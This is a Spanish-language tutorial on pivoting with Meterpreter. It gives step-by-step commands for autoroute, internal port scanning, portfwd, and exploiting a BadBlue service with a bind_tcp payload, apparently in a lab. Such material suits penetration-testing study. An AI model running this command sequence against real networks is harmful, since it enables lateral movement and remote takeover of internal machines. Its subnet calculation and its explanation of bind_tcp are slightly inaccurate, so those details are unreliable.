# Pivoting con Meterpreter

## 1. ¿Qué es pivotear?
En ciberseguridad, **pivotear** significa utilizar una máquina comprometida como punto de salto para acceder a otras máquinas que no son directamente accesibles desde nuestro host atacante.

Esto es útil cuando:
- Nuestro equipo atacante no tiene visibilidad directa de la red interna de la víctima.
- Las otras máquinas objetivo están en redes internas o subredes distintas.
- Queremos realizar movimientos laterales (lateral movement) dentro de una infraestructura.

---

## 2. ¿Cómo funciona?
1. Comprometemos una máquina (victima 1) que sí tiene acceso a otra red interna.
2. Establecemos rutas en Metasploit para que el tráfico pase a través de la sesión de **Meterpreter** de esa máquina.
3. Desde nuestra máquina atacante podemos escanear y explotar máquinas internas **a través de la víctima comprometida**.

---

## 3. Flujo de trabajo paso a paso

### Paso 1: Ganar acceso y reconocer el entorno
```bash
meterpreter > sysinfo
meterpreter > ipconfig
```
- `sysinfo`: Muestra información del sistema operativo.
- `ipconfig`: Lista todas las interfaces y direcciones IP a las que la máquina tiene acceso.

**Objetivo:** Identificar subredes internas que nuestro host atacante no puede alcanzar directamente.

---

### Paso 2: Añadir una ruta para pivotear
Supongamos que encontramos una interfaz con IP `10.0.28.125`.
Quitamos el último octeto y lo sustituimos por `.0/20` para cubrir toda la subred:
```bash
run autoroute -s 10.0.28.0/20
```
- **Qué hace:** Configura Meterpreter para que enrute todo el tráfico hacia esa subred a través de la sesión actual.

---

### Paso 3: Mandar la sesión al background y renombrarla
```bash
background
sessions -n "victima1"
```
- Renombrar la sesión ayuda a identificarla fácilmente si trabajamos con varias.

---

### Paso 4: Escanear la segunda máquina desde la víctima
Usamos el módulo de escaneo de puertos:
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.28.130
set PORTS 1-100
exploit
```
- Esto escanea puertos **a través de la sesión pivotada**.

---

### Paso 5: Crear un Port Forwarding (portfwd)
Supongamos que el escaneo detecta un servicio HTTP en el puerto 80:
```bash
portfwd add -l 1234 -p 80 -r 10.0.28.130
```
- `-l 1234`: Puerto local en nuestra máquina.
- `-p 80`: Puerto de la máquina remota.
- `-r`: IP de la máquina interna a la que queremos acceder.

---

### Paso 6: Escanear el puerto redirigido desde nuestra máquina
```bash
db_nmap -sS -sV -p 1234 localhost
```
- Escanea el puerto `1234` en `localhost`, que en realidad está reenviado al puerto 80 de la máquina interna.

---

### Paso 7: Explotar un servicio vulnerable
Supongamos que `nmap` detecta **BadBlue** vulnerable.

Usamos el exploit correspondiente:
```bash
use exploit/windows/http/passthru
set payload windows/meterpreter/bind_tcp
set RHOSTS 10.0.28.130
set LPORT 4444
exploit
```
**Nota:**  
- Se usa `bind_tcp` porque el ataque es desde la víctima interna hacia nosotros (estamos pivotando y puede que no tengamos acceso inverso con `reverse_tcp`).
- `bind_tcp` hace que el payload abra un puerto en la máquina víctima interna y nuestro Metasploit se conecte a él.

---

## 4. Resumen del proceso

1. **Comprometer primera máquina** (victima1).
2. **Identificar subred interna** con `ipconfig`.
3. **Añadir ruta** con `autoroute`.
4. **Escanear red interna** desde Metasploit.
5. **Redirigir puertos** con `portfwd`.
6. **Escanear servicios** desde nuestro host.
7. **Explotar máquinas internas** usando los módulos de Metasploit.

---

## 5. Ventajas de pivotear
- Permite atacar máquinas que no son accesibles directamente.
- Evita detecciones en la frontera de la red (firewalls externos).
- Facilita la enumeración y explotación de entornos internos.

